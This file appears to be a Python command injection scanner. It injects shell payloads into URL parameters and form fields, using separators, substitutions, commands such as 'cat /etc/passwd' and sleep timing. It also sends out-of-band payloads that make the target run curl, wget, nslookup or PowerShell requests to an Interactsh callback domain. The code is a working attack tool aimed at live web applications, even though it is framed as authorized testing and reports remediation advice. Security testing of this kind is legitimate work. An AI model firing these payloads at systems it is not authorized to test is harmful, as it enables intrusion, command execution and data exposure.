"""
Enhanced Command Injection Scanner Module - Production Ready
WARNING: This tool is for authorized security testing only.
Only use on systems you own or have explicit permission to test.
"""

import asyncio
import httpx
import re
import time
import hashlib
import statistics
import subprocess
import threading
import secrets
from queue import Queue, Empty
from typing import Dict, List, Any, Optional, Tuple, Set
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
from dataclasses import dataclass, field
import base64
import json
from contextlib import asynccontextmanager
from enum import Enum

# Install required packages:
# pip install httpx tenacity
# go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

from tenacity import (
    retry,
    stop_after_attempt,
    wait_exponential,
    retry_if_exception_type
)

# ============================================================================
# ENUMS AND DATA CLASSES
# ============================================================================

class ScanType(Enum):
    """Scan intensity levels"""
    PASSIVE = "passive"      # No active testing
    ACTIVE = "active"        # Standard testing
    AGGRESSIVE = "aggressive" # Full testing with OOB

class SeverityLevel(Enum):
    """Vulnerability severity classification"""
    INFO = "info"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

@dataclass
class ScanConfig:
    """Scanner configuration"""
    target: str
    scan_type: ScanType = ScanType.ACTIVE
    timeout: int = 30
    headers: Optional[Dict[str, str]] = None
    max_retries: int = 3
    connection_pool_size: int = 10
    rate_limit_delay: float = 0.1

@dataclass
class Vulnerability:
    """Vulnerability details"""
    module: str
    name: str
    description: str
    severity: SeverityLevel
    confidence: float
    affected_urls: List[str]
    evidence: Dict[str, Any]
    remediation: str
    references: Optional[List[str]] = None
    cwe_ids: Optional[List[str]] = None

@dataclass
class ScanResult:
    """Scan results container"""
    module_name: str
    success: bool
    started_at: datetime
    completed_at: datetime
    vulnerabilities: List[Vulnerability]
    errors: List[str]
    warnings: List[str]
    info: Dict[str, Any]
    statistics: Dict[str, Any]

@dataclass
class InjectionContext:
    """Injection context information"""
    context_type: str
    prefix: str
    suffix: str
    escape_required: bool

@dataclass
class OOBInteraction:
    """Out-of-band interaction data"""
    protocol: str
    timestamp: datetime
    data: Dict[str, Any]
    unique_id: str

# ============================================================================
# CONNECTION POOL MANAGER
# ============================================================================

class ConnectionPoolManager:
    """Manages HTTP connection pooling with retry logic."""
    
    def __init__(self, config: ScanConfig):
        self.config = config
        self.limits = httpx.Limits(
            max_keepalive_connections=config.connection_pool_size,
            max_connections=config.connection_pool_size * 2,
            keepalive_expiry=30.0
        )
        self.timeout = httpx.Timeout(
            timeout=config.timeout,
            connect=10.0,
            read=config.timeout,
            write=10.0,
            pool=5.0
        )
        self._client: Optional[httpx.AsyncClient] = None
    
    @asynccontextmanager
    async def get_client(self):
        """Get or create an async HTTP client."""
        if self._client is None:
            self._client = httpx.AsyncClient(
                verify=False,
                timeout=self.timeout,
                limits=self.limits,
                headers=self.config.headers or {},
                follow_redirects=True,
                http2=True
            )
        try:
            yield self._client
        finally:
            pass
    
    async def close(self):
        """Close the HTTP client."""
        if self._client:
            await self._client.aclose()
            self._client = None
    
    @retry(
        stop=stop_after_attempt(3),
        wait=wait_exponential(multiplier=1, min=1, max=10),
        retry=retry_if_exception_type((
            httpx.ConnectTimeout,
            httpx.ReadTimeout,
            httpx.ConnectError,
            httpx.RemoteProtocolError
        ))
    )
    async def request_with_retry(self, method: str, url: str, **kwargs) -> httpx.Response:
        """Make HTTP request with automatic retry."""
        async with self.get_client() as client:
            response = await client.request(method, url, **kwargs)
            return response
    
    async def get(self, url: str, **kwargs) -> httpx.Response:
        """GET request with retry."""
        return await self.request_with_retry("GET", url, **kwargs)
    
    async def post(self, url: str, **kwargs) -> httpx.Response:
        """POST request with retry."""
        return await self.request_with_retry("POST", url, **kwargs)

# ============================================================================
# PAYLOAD GENERATOR
# ============================================================================

class PayloadGenerator:
    """Advanced payload generation with context awareness."""
    
    def __init__(self):
        self.commands = {
            'linux': {
                'info': ['id', 'whoami', 'uname -a', 'pwd', 'hostname'],
                'test': ['echo cmdinj', 'cat /etc/passwd', 'ls -la'],
                'sleep': ['sleep {duration}', 'timeout {duration}'],
                'dns': ['nslookup {domain}', 'dig {domain}', 'host {domain}'],
                'http': ['curl -s {url}', 'wget -q -O- {url}'],
            },
            'windows': {
                'info': ['whoami', 'hostname', 'systeminfo', 'ver'],
                'test': ['echo cmdinj', 'type C:\\Windows\\win.ini', 'dir'],
                'sleep': ['ping -n {duration} 127.0.0.1', 'timeout /t {duration}'],
                'dns': ['nslookup {domain}'],
                'http': ['curl -s {url}', 'powershell -c "Invoke-WebRequest -Uri {url}"'],
            }
        }
        
        self.separators = [';', '|', '||', '&', '&&', '\n', '\r\n', '%0a', '%0d%0a']
        self.command_subs = ['$({cmd})', '`{cmd}`']
    
    def generate_basic_payloads(self, os_type: str = 'linux') -> List[str]:
        """Generate basic command injection payloads."""
        payloads = []
        commands = self.commands.get(os_type, self.commands['linux'])
        
        # Use most effective commands
        for cmd in commands['info'][:3]:
            for sep in self.separators[:5]:
                payloads.append(f"{sep} {cmd}")
                payloads.append(f"{sep}{cmd}")
        
        # Command substitution
        for cmd in commands['info'][:2]:
            for sub in self.command_subs:
                payloads.append(sub.format(cmd=cmd))
        
        return payloads
    
    def generate_time_based_payloads(self, duration: int = 5, os_type: str = 'linux') -> List[str]:
        """Generate time-based blind injection payloads."""
        payloads = []
        commands = self.commands.get(os_type, self.commands['linux'])
        
        for sleep_cmd in commands['sleep']:
            cmd = sleep_cmd.format(duration=duration)
            for sep in self.separators[:5]:
                payloads.append(f"{sep} {cmd}")
                payloads.append(f"{sep}{cmd}")
        
        return payloads
    
    def generate_oob_payloads(self, domain: str, unique_id: str, os_type: str = 'linux') -> List[str]:
        """Generate out-of-band interaction payloads."""
        payloads = []
        commands = self.commands.get(os_type, self.commands['linux'])
        subdomain = f"{unique_id}.{domain}"
        
        # DNS exfiltration
        for dns_cmd in commands['dns']:
            cmd = dns_cmd.format(domain=subdomain)
            for sep in self.separators[:3]:
                payloads.append(f"{sep} {cmd}")
        
        # HTTP exfiltration
        for http_cmd in commands['http']:
            url = f"http://{subdomain}"
            cmd = http_cmd.format(url=url)
            for sep in self.separators[:2]:
                payloads.append(f"{sep} {cmd}")
        
        return payloads
    
    def generate_context_aware_payloads(self, context: InjectionContext, base_cmd: str) -> List[str]:
        """Generate context-specific payloads."""
        payloads = []
        
        if context.context_type == 'single_quote':
            payloads.extend([
                f"' {base_cmd} '",
                f"'; {base_cmd}; '",
                f"' || {base_cmd} || '"
            ])
        elif context.context_type == 'double_quote':
            payloads.extend([
                f'" {base_cmd} "',
                f'"; {base_cmd}; "',
                f'"$({base_cmd})"'
            ])
        elif context.context_type == 'backtick':
            payloads.append(f"` {base_cmd} `")
        else:
            for sep in self.separators[:5]:
                payloads.append(f"{sep} {base_cmd}")
        
        return payloads

# ============================================================================
# RESPONSE ANALYZER
# ============================================================================

class ResponseAnalyzer:
    """Analyzes HTTP responses for command injection indicators."""
    
    def __init__(self):
        self.os_patterns = {
            'linux': [
                r'uid=\d+\([^)]+\)',
                r'gid=\d+\([^)]+\)',
                r'Linux\s+\S+\s+\d+\.\d+',
                r'/bin/(bash|sh|dash)',
                r'root:x:0:0:',
                r'GNU/Linux',
            ],
            'windows': [
                r'[A-Z]+\\[A-Za-z0-9_-]+',
                r'NT AUTHORITY\\',
                r'Windows\s+\[Version\s+\d+\.\d+',
                r'Microsoft Windows',
                r'C:\\(Windows|Users|Program Files)',
            ],
            'general': [
                r'command not found',
                r'is not recognized as an internal or external command',
                r'Permission denied',
                r'Access is denied',
                r'syntax error',
            ]
        }
        
        self.command_output_patterns = {
            'id': r'uid=\d+',
            'whoami': r'[a-z_][a-z0-9_-]*\$?',
            'hostname': r'[a-z0-9][a-z0-9\-\.]*',
            'uname': r'(Linux|Darwin|FreeBSD|SunOS)',
            'echo': r'cmdinj',
        }
    
    def detect_os(self, response_text: str) -> Tuple[Optional[str], float]:
        """Detect operating system from response."""
        os_scores = {'linux': 0, 'windows': 0, 'general': 0}
        
        for os_type, patterns in self.os_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    os_scores[os_type] += 1
        
        total_matches = sum(os_scores.values())
        if total_matches == 0:
            return None, 0.0
        
        detected_os = max(os_scores, key=os_scores.get)
        if detected_os == 'general':
            return 'Unknown', min(os_scores[detected_os] * 0.2, 0.6)
        
        confidence = min(os_scores[detected_os] / len(self.os_patterns[detected_os]), 0.95)
        return detected_os.capitalize(), confidence
    
    def detect_command_output(self, response_text: str, command: str) -> bool:
        """Check if response contains command output."""
        base_cmd = command.strip().split()[0] if command else ''
        
        if base_cmd in self.command_output_patterns:
            pattern = self.command_output_patterns[base_cmd]
            return bool(re.search(pattern, response_text, re.IGNORECASE))
        
        return False
    
    def detect_injection_context(self, response_text: str, injection_point: str) -> InjectionContext:
        """Detect injection context from error messages."""
        if not injection_point or injection_point not in response_text:
            return InjectionContext('none', '', '', False)
        
        idx = response_text.find(injection_point)
        context_start = max(0, idx - 20)
        context_end = min(len(response_text), idx + len(injection_point) + 20)
        context_text = response_text[context_start:context_end]
        
        # Fixed: Check for actual backtick character instead of empty string
        if "'" in context_text[:20]:
            return InjectionContext('single_quote', "'", "'", True)
        elif '"' in context_text[:20]:
            return InjectionContext('double_quote', '"', '"', True)
        elif '`' in context_text[:20]:  # Fixed: Check for backtick character
            return InjectionContext('backtick', '`', '`', True)
        
        return InjectionContext('none', '', '', False)

# ============================================================================
# INTERACTSH OOB MANAGER
# ============================================================================

class InteractshOOBManager:
    """Manages out-of-band interactions using Interactsh."""
    
    def __init__(self):
        self.process: Optional[subprocess.Popen] = None
        self.domain: Optional[str] = None
        self.interaction_queue: Queue = Queue()
        self.reader_thread: Optional[threading.Thread] = None
        self.is_running: bool = False
        self._lock = threading.Lock()  # Added lock for thread safety
        self._domain_ready = threading.Event()  # Added event for synchronization
    
    def start(self) -> bool:
        """Start the Interactsh client process."""
        try:
            # Start interactsh-client with JSON output
            self.process = subprocess.Popen(
                ['interactsh-client', '-json', '-v'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1
            )
            
            # Start reader thread first
            self.is_running = True
            self.reader_thread = threading.Thread(target=self._read_interactions, args=(True,))
            self.reader_thread.daemon = True
            self.reader_thread.start()
            
            # Wait for domain to be set (with timeout)
            if self._domain_ready.wait(timeout=10):
                print(f"✓ Interactsh initialized with domain: {self.domain}")
                return True
            else:
                print("✗ Timeout waiting for Interactsh domain")
                self.stop()
                return False
            
        except FileNotFoundError:
            print("✗ interactsh-client not found. Install with:")
            print("  go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest")
            return False
        except Exception as e:
            print(f"✗ Error starting Interactsh: {e}")
            return False
    
    def _read_interactions(self, initial_setup: bool = False):
        """Read interactions from subprocess output."""
        domain_pattern = re.compile(r'Listing OAST requests for \[(.*?)\]')
        
        while self.is_running and self.process and self.process.poll() is None:
            try:
                line = self.process.stdout.readline()
                if not line:
                    continue
                    
                line = line.strip()
                
                # Look for domain in initial output
                if not self.domain:
                    match = domain_pattern.search(line)
                    if match:
                        with self._lock:
                            self.domain = match.group(1).strip()
                            self._domain_ready.set()  # Signal that domain is ready
                
                # Process JSON interactions
                if line.startswith('{') and '"protocol"' in line:
                    try:
                        interaction = json.loads(line)
                        self.interaction_queue.put(interaction)
                    except json.JSONDecodeError:
                        pass
            except Exception:
                if self.is_running:  # Only care about exceptions if we're still running
                    pass
    
    def check_interaction(self, unique_id: str, timeout: int = 5) -> List[OOBInteraction]:
        """Check for interactions matching unique ID."""
        interactions = []
        end_time = time.time() + timeout
        checked_interactions = []  # Track already checked interactions
        
        while time.time() < end_time:
            try:
                # Get all queued interactions
                while not self.interaction_queue.empty():
                    try:
                        interaction = self.interaction_queue.get_nowait()
                        checked_interactions.append(interaction)
                    except Empty:
                        break
                
                # Check all interactions for our unique ID
                for interaction in checked_interactions:
                    full_id = interaction.get('full-id', '')
                    raw_request = interaction.get('raw-request', '')
                    
                    if unique_id in full_id or unique_id in raw_request:
                        interactions.append(
                            OOBInteraction(
                                protocol=interaction.get('protocol', 'unknown'),
                                timestamp=datetime.now(),
                                data={
                                    'remote_address': interaction.get('remote-address'),
                                    'raw_request': raw_request[:500] if raw_request else '',
                                    'full_id': full_id
                                },
                                unique_id=unique_id
                            )
                        )
                
                if interactions:
                    break  # Found what we're looking for
                    
                # Small sleep to avoid busy waiting
                time.sleep(0.5)
                
            except Exception:
                pass
        
        # Put back unclaimed interactions
        for interaction in checked_interactions:
            full_id = interaction.get('full-id', '')
            raw_request = interaction.get('raw-request', '')
            if unique_id not in full_id and unique_id not in raw_request:
                self.interaction_queue.put(interaction)
        
        return interactions
    
    def generate_unique_id(self, context: str = "") -> str:
        """Generate unique identifier for tracking."""
        timestamp = str(time.time()).encode()
        context_bytes = context.encode()
        random_bytes = secrets.token_bytes(8)
        return hashlib.md5(timestamp + context_bytes + random_bytes).hexdigest()[:12]
    
    def stop(self):
        """Stop the Interactsh client."""
        self.is_running = False
        self._domain_ready.set()  # Release any waiting threads
        
        if self.process:
            try:
                self.process.terminate()
                self.process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                try:
                    self.process.kill()
                    self.process.wait(timeout=2)
                except:
                    pass
            except:
                pass
            finally:
                self.process = None
        
        if self.reader_thread and self.reader_thread.is_alive():
            self.reader_thread.join(timeout=2)
        
        self.domain = None
        print("✓ Interactsh session closed")

# ============================================================================
# COMMAND INJECTION SCANNER
# ============================================================================

class CommandInjectionScanner:
    """Enhanced Command Injection vulnerability scanner."""
    
    def __init__(self):
        self.name = "CommandInjectionScanner"
        self.description = "Command injection vulnerability scanner with OOB detection"
        self.payload_generator = PayloadGenerator()
        self.response_analyzer = ResponseAnalyzer()
        self.oob_manager = InteractshOOBManager()
        self.pool_manager: Optional[ConnectionPoolManager] = None
        
        self.common_params = [
            'cmd', 'exec', 'command', 'execute', 'run',
            'ping', 'host', 'hostname', 'ip', 'address',
            'file', 'filename', 'path', 'dir', 'directory',
            'url', 'uri', 'src', 'dest', 'target',
            'user', 'username', 'name', 'email',
            'search', 'query', 'q', 'keyword',
        ]
    
    def validate_target(self, target: str) -> bool:
        """Validate target URL."""
        if not target:
            return False
            
        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"
        
        try:
            parsed = urlparse(target)
            return bool(parsed.scheme and parsed.netloc)
        except:
            return False
    
    async def scan(self, config: ScanConfig) -> ScanResult:
        """Perform comprehensive command injection scan."""
        started_at = datetime.now()
        vulnerabilities = []
        errors = []
        warnings = []
        info = {
            'tested_parameters': [],
            'vulnerable_parameters': [],
            'os_detected': None,
            'oob_enabled': False,
        }
        statistics = {
            'urls_tested': 0,
            'parameters_tested': 0,
            'payloads_tested': 0,
            'vulnerabilities_found': 0,
            'requests_sent': 0,
        }
        
        # Initialize connection pool
        self.pool_manager = ConnectionPoolManager(config)
        
        try:
            # Initialize OOB for aggressive scans
            if config.scan_type == ScanType.AGGRESSIVE:
                oob_initialized = self.oob_manager.start()
                info['oob_enabled'] = oob_initialized
                if oob_initialized:
                    info['oob_domain'] = self.oob_manager.domain
            
            # Normalize target URL
            target_url = config.target
            if not target_url.startswith(('http://', 'https://')):
                target_url = f"https://{target_url}"
            
            # Execute scan based on type
            if config.scan_type == ScanType.PASSIVE:
                # Passive detection only
                passive_vulns = await self._passive_detection(target_url, config)
                vulnerabilities.extend(passive_vulns)
                
            else:
                # Active scanning
                # Test URL parameters
                param_results = await self._test_url_parameters(target_url, config)
                vulnerabilities.extend(param_results['vulnerabilities'])
                info['tested_parameters'].extend(param_results['tested_params'])
                statistics.update({
                    'parameters_tested': len(param_results['tested_params']),
                    'payloads_tested': param_results['payloads_tested'],
                    'requests_sent': param_results['requests_sent']
                })
                
                # Test forms
                form_results = await self._test_forms(target_url, config)
                vulnerabilities.extend(form_results['vulnerabilities'])
                statistics['requests_sent'] += form_results['requests_sent']
                
                # Time-based testing
                if config.scan_type in [ScanType.AGGRESSIVE, ScanType.ACTIVE]:
                    time_results = await self._test_time_based(target_url, config)
                    vulnerabilities.extend(time_results['vulnerabilities'])
                    statistics['requests_sent'] += time_results['requests_sent']
                
                # OOB testing
                if config.scan_type == ScanType.AGGRESSIVE and info['oob_enabled']:
                    oob_results = await self._test_oob(target_url, config)
                    vulnerabilities.extend(oob_results['vulnerabilities'])
                    statistics['requests_sent'] += oob_results['requests_sent']
            
            # Update statistics
            statistics['vulnerabilities_found'] = len(vulnerabilities)
            statistics['urls_tested'] = 1
            
            # Extract vulnerability details
            for vuln in vulnerabilities:
                if 'parameter' in vuln.evidence:
                    param = vuln.evidence['parameter']
                    if param not in info['vulnerable_parameters']:
                        info['vulnerable_parameters'].append(param)
                if 'os_type' in vuln.evidence:
                    info['os_detected'] = vuln.evidence['os_type']
            
            # Generate warnings
            if len(vulnerabilities) > 5:
                warnings.append(f"Multiple injection points found ({len(vulnerabilities)}). Target may be highly vulnerable.")
            
        except Exception as e:
            errors.append(f"Scan failed: {str(e)}")
            
        finally:
            # Cleanup resources
            if info['oob_enabled']:
                self.oob_manager.stop()
            if self.pool_manager:
                await self.pool_manager.close()
        
        completed_at = datetime.now()
        
        return ScanResult(
            module_name=self.name,
            success=len(errors) == 0,
            started_at=started_at,
            completed_at=completed_at,
            vulnerabilities=vulnerabilities,
            errors=errors,
            warnings=warnings,
            info=info,
            statistics=statistics
        )
    
    async def _passive_detection(self, url: str, config: ScanConfig) -> List[Vulnerability]:
        """Passive detection of command injection indicators."""
        vulnerabilities = []
        
        try:
            response = await self.pool_manager.get(url)
            
            # Check for dangerous functions
            dangerous_patterns = {
                r'exec\s*\(': 'exec()',
                r'system\s*\(': 'system()',
                r'shell_exec\s*\(': 'shell_exec()',
                r'eval\s*\(': 'eval()',
                r'Runtime\.getRuntime\(\)\.exec': 'Runtime.exec()',
                r'popen\s*\(': 'popen()',
                r'passthru\s*\(': 'passthru()',
            }
            
            found_functions = []
            for pattern, func_name in dangerous_patterns.items():
                if re.search(pattern, response.text, re.IGNORECASE):
                    found_functions.append(func_name)
            
            if found_functions:
                vulnerabilities.append(
                    Vulnerability(
                        module=self.name,
                        name="Dangerous Command Execution Functions Exposed",
                        description=f"Found potentially dangerous functions in response: {', '.join(found_functions)}",
                        severity=SeverityLevel.MEDIUM,
                        confidence=0.4,
                        affected_urls=[url],
                        evidence={'functions_found': found_functions},
                        remediation="Review and secure command execution functions. Use parameterized commands instead of direct execution.",
                        references=["https://owasp.org/www-community/attacks/Command_Injection"],
                        cwe_ids=["CWE-78"]
                    )
                )
                
        except Exception:
            pass
        
        return vulnerabilities
    
    async def _test_url_parameters(self, url: str, config: ScanConfig) -> Dict[str, Any]:
        """Test URL parameters for command injection."""
        vulnerabilities = []
        tested_params = []
        payloads_tested = 0
        requests_sent = 0
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Use common parameters if none found
        if not params:
            params = {param: ['test'] for param in self.common_params[:5]}
        
        try:
            # Get baseline response
            baseline_response = await self.pool_manager.get(url)
            baseline_text = baseline_response.text
            requests_sent += 1
            
            # Test each parameter
            for param_name in list(params.keys())[:10]:  # Test up to 10 parameters
                tested_params.append(param_name)
                original_value = params[param_name][0] if params[param_name] else 'test'
                
                # Detect injection context
                context = self.response_analyzer.detect_injection_context(baseline_text, original_value)
                
                # Generate payloads
                test_payloads = self.payload_generator.generate_basic_payloads('linux')[:15]
                if context.context_type != 'none':
                    # Add context-aware payloads
                    context_payloads = self.payload_generator.generate_context_aware_payloads(
                        context, 'whoami'
                    )
                    test_payloads.extend(context_payloads[:5])
                
                # Test each payload
                for payload in test_payloads:
                    payloads_tested += 1
                    
                    # Build test URL
                    test_params = params.copy()
                    test_params[param_name] = [original_value + payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                    
                    try:
                        # Send request
                        response = await self.pool_manager.get(test_url)
                        requests_sent += 1
                        
                        # Analyze response
                        os_type, confidence = self.response_analyzer.detect_os(response.text)
                        
                        if os_type and confidence > 0.7:
                            vulnerabilities.append(
                                Vulnerability(
                                    module=self.name,
                                    name=f"Command Injection in parameter '{param_name}'",
                                    description=f"The parameter '{param_name}' is vulnerable to OS command injection. Successfully executed commands on {os_type} system.",
                                    severity=SeverityLevel.CRITICAL,
                                    confidence=confidence,
                                    affected_urls=[url],
                                    evidence={
                                        'parameter': param_name,
                                        'payload': payload,
                                        'os_type': os_type,
                                        'context': context.context_type if context else 'none'
                                    },
                                    remediation="Implement strict input validation. Use parameterized commands or whitelist allowed values. Never pass user input directly to system commands.",
                                    references=[
                                        "https://owasp.org/www-community/attacks/Command_Injection",
                                        "https://cwe.mitre.org/data/definitions/78.html"
                                    ],
                                    cwe_ids=["CWE-78", "CWE-77"]
                                )
                            )
                            break  # Found vulnerability, move to next parameter
                        
                        # Rate limiting
                        await asyncio.sleep(config.rate_limit_delay)
                        
                    except Exception:
                        pass
                        
        except Exception:
            pass
        
        return {
            'vulnerabilities': vulnerabilities,
            'tested_params': tested_params,
            'payloads_tested': payloads_tested,
            'requests_sent': requests_sent
        }
    
    async def _test_forms(self, url: str, config: ScanConfig) -> Dict[str, Any]:
        """Test form inputs for command injection."""
        vulnerabilities = []
        requests_sent = 0
        
        try:
            # Get page with forms
            response = await self.pool_manager.get(url)
            requests_sent += 1
            
            # Extract forms
            form_pattern = re.compile(r'<form[^>]*>(.*?)</form>', re.IGNORECASE | re.DOTALL)
            forms = form_pattern.findall(response.text)
            
            for form_html in forms[:3]:  # Test up to 3 forms
                # Extract form action
                action_match = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
                action = action_match.group(1) if action_match else url
                
                if not action.startswith(('http://', 'https://')):
                    action = urljoin(url, action)
                
                # Extract input fields
                input_pattern = re.compile(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', re.IGNORECASE)
                inputs = input_pattern.findall(form_html)
                
                for input_name in inputs[:5]:  # Test up to 5 inputs per form
                    # Skip sensitive fields
                    if input_name.lower() in ['csrf', 'token', 'password', 'passwd', 'pwd']:
                        continue
                    
                    # Generate payloads
                    payloads = self.payload_generator.generate_basic_payloads('linux')[:5]
                    
                    for payload in payloads:
                        form_data = {input_name: f"test{payload}"}
                        
                        try:
                            # Submit form
                            test_response = await self.pool_manager.post(action, data=form_data)
                            requests_sent += 1
                            
                            # Analyze response
                            os_type, confidence = self.response_analyzer.detect_os(test_response.text)
                            
                            if os_type and confidence > 0.7:
                                vulnerabilities.append(
                                    Vulnerability(
                                        module=self.name,
                                        name=f"Command Injection in form field '{input_name}'",
                                        description=f"Form field '{input_name}' at {action} is vulnerable to command injection.",
                                        severity=SeverityLevel.CRITICAL,
                                        confidence=confidence,
                                        affected_urls=[action],
                                        evidence={
                                            'field': input_name,
                                            'payload': payload,
                                            'os_type': os_type,
                                            'form_action': action
                                        },
                                        remediation="Sanitize all form inputs before processing. Never pass user input directly to system commands.",
                                        references=["https://owasp.org/www-community/attacks/Command_Injection"],
                                        cwe_ids=["CWE-78"]
                                    )
                                )
                                break
                            
                            await asyncio.sleep(config.rate_limit_delay)
                            
                        except Exception:
                            pass
                            
        except Exception:
            pass
        
        return {
            'vulnerabilities': vulnerabilities,
            'requests_sent': requests_sent
        }
    
    async def _test_time_based(self, url: str, config: ScanConfig) -> Dict[str, Any]:
        """Test for time-based blind command injection."""
        vulnerabilities = []
        requests_sent = 0
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query) or {param: ['test'] for param in self.common_params[:3]}
        
        try:
            # Establish baseline response times
            baseline_times = []
            for _ in range(3):
                try:
                    start = time.time()
                    await self.pool_manager.get(url)
                    elapsed = time.time() - start
                    baseline_times.append(elapsed)
                    requests_sent += 1
                except:
                    pass
            
            if len(baseline_times) < 2:
                return {'vulnerabilities': [], 'requests_sent': requests_sent}
            
            baseline_avg = statistics.mean(baseline_times)
            baseline_stddev = statistics.stdev(baseline_times) if len(baseline_times) > 1 else 0.5
            
            # Test each parameter
            for param_name in list(params.keys())[:5]:
                sleep_duration = 5
                
                # Generate time-based payloads
                payloads = self.payload_generator.generate_time_based_payloads(sleep_duration, 'linux')[:5]
                
                for payload in payloads:
                    test_params = params.copy()
                    test_params[param_name] = [params[param_name][0] + payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                    
                    try:
                        # Measure response time
                        start = time.time()
                        await self.pool_manager.get(test_url)
                        elapsed = time.time() - start
                        requests_sent += 1
                        
                        # Check for significant delay
                        if elapsed >= sleep_duration - 1:
                            z_score = (elapsed - baseline_avg) / (baseline_stddev if baseline_stddev > 0 else 1)
                            
                            if z_score > 3:  # 3 standard deviations above mean
                                confidence = min(0.85, 0.6 + (z_score / 20))
                                
                                vulnerabilities.append(
                                    Vulnerability(
                                        module=self.name,
                                        name=f"Time-based Blind Command Injection in '{param_name}'",
                                        description=f"Parameter '{param_name}' appears vulnerable to time-based command injection. Observed delay of {elapsed:.1f}s when expecting {sleep_duration}s.",
                                        severity=SeverityLevel.HIGH,
                                        confidence=confidence,
                                        affected_urls=[url],
                                        evidence={
                                            'parameter': param_name,
                                            'payload': payload,
                                            'observed_delay': round(elapsed, 2),
                                            'expected_delay': sleep_duration,
                                            'baseline_avg': round(baseline_avg, 2)
                                        },
                                        remediation="Implement proper input validation and sanitization. Use parameterized commands.",
                                        references=["https://owasp.org/www-community/attacks/Blind_Command_Injection"],
                                        cwe_ids=["CWE-78", "CWE-74"]
                                    )
                                )
                                break
                    except:
                        pass
                        
        except:
            pass
        
        return {
            'vulnerabilities': vulnerabilities,
            'requests_sent': requests_sent
        }
    
    async def _test_oob(self, url: str, config: ScanConfig) -> Dict[str, Any]:
        """Test for out-of-band command injection."""
        vulnerabilities = []
        requests_sent = 0
        
        oob_domain = self.oob_manager.domain
        if not oob_domain:
            return {'vulnerabilities': [], 'requests_sent': 0}
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query) or {param: ['test'] for param in self.common_params[:3]}
        
        try:
            for param_name in list(params.keys())[:5]:
                unique_id = self.oob_manager.generate_unique_id(param_name)
                interaction_found = False
                
                # Test both Linux and Windows payloads
                for os_type in ['linux', 'windows']:
                    if interaction_found:
                        break
                        
                    payloads = self.payload_generator.generate_oob_payloads(
                        domain=oob_domain,
                        unique_id=unique_id,
                        os_type=os_type
                    )
                    
                    for payload in payloads[:5]:
                        test_params = params.copy()
                        original_value = params[param_name][0] if params[param_name] else 'test'
                        test_params[param_name] = [original_value + payload]
                        test_query = urlencode(test_params, doseq=True)
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                        
                        try:
                            # Send request
                            await asyncio.wait_for(
                                self.pool_manager.get(test_url),
                                timeout=5
                            )
                            requests_sent += 1
                        except asyncio.TimeoutError:
                            requests_sent += 1
                        except Exception:
                            pass
                        
                        await asyncio.sleep(config.rate_limit_delay)
                
                # Wait for and check interactions
                await asyncio.sleep(3)
                interactions = self.oob_manager.check_interaction(unique_id)
                
                if interactions:
                    interaction = interactions[0]
                    vulnerabilities.append(
                        Vulnerability(
                            module=self.name,
                            name=f"Blind Command Injection (OOB) in '{param_name}'",
                            description=f"Successfully triggered out-of-band interaction via parameter '{param_name}'. The application executed external network requests to attacker-controlled domain.",
                            severity=SeverityLevel.CRITICAL,
                            confidence=0.95,
                            affected_urls=[url],
                            evidence={
                                'parameter': param_name,
                                'oob_protocol': interaction.protocol,
                                'oob_domain': oob_domain,
                                'unique_id': unique_id,
                                'interaction_data': interaction.data
                            },
                            remediation="Implement strict input validation. Never pass user input to system commands. Use allowlists for command parameters.",
                            references=[
                                "https://owasp.org/www-community/attacks/Command_Injection",
                                "https://portswigger.net/web-security/os-command-injection/blind"
                            ],
                            cwe_ids=["CWE-78", "CWE-74"]
                        )
                    )
                    
        except Exception as e:
            print(f"OOB testing error: {e}")
        
        return {
            'vulnerabilities': vulnerabilities,
            'requests_sent': requests_sent
        }


# ============================================================================
# MAIN EXECUTION
# ============================================================================

async def main():
    """Example usage of the command injection scanner."""
    
    scanner = CommandInjectionScanner()
    
    # Configure scan
    config = ScanConfig(
        target="http://testsite.example.com/search?q=test",
        scan_type=ScanType.AGGRESSIVE,  # Use AGGRESSIVE for full testing including OOB
        timeout=30,
        max_retries=3,
        connection_pool_size=10,
        rate_limit_delay=0.1,
        headers={
            'User-Agent': 'Mozilla/5.0 (Security Scanner)',
        }
    )
    
    if not scanner.validate_target(config.target):
        print("❌ Invalid target URL")
        return
    
    print(f"🎯 Starting {scanner.name}")
    print(f"📍 Target: {config.target}")
    print(f"🔧 Scan Type: {config.scan_type.value}")
    print(f"✨ Features: Connection Pooling, Retry Logic, OOB Detection")
    print("-" * 60)
    
    # Run scan
    result = await scanner.scan(config)
    
    # Display results
    print(f"\n{'='*60}")
    print(f"Scan completed: {'✅ SUCCESS' if result.success else '❌ FAILED'}")
    print(f"⏱️  Duration: {(result.completed_at - result.started_at).total_seconds():.2f} seconds")
    print(f"{'='*60}")
    
    # Statistics
    print(f"\n📊 Statistics:")
    for key, value in result.statistics.items():
        print(f"  • {key.replace('_', ' ').title()}: {value}")
    
    # Vulnerabilities
    print(f"\n🔍 Vulnerabilities Found: {len(result.vulnerabilities)}")
    if result.vulnerabilities:
        for i, vuln in enumerate(result.vulnerabilities, 1):
            print(f"\n  {i}. [{vuln.severity.value.upper()}] {vuln.name}")
            print(f"     ├─ Confidence: {vuln.confidence:.1%}")
            print(f"     ├─ Description: {vuln.description}")
            
            # Evidence details
            if 'parameter' in vuln.evidence:
                print(f"     ├─ Parameter: {vuln.evidence['parameter']}")
            if 'field' in vuln.evidence:
                print(f"     ├─ Field: {vuln.evidence['field']}")
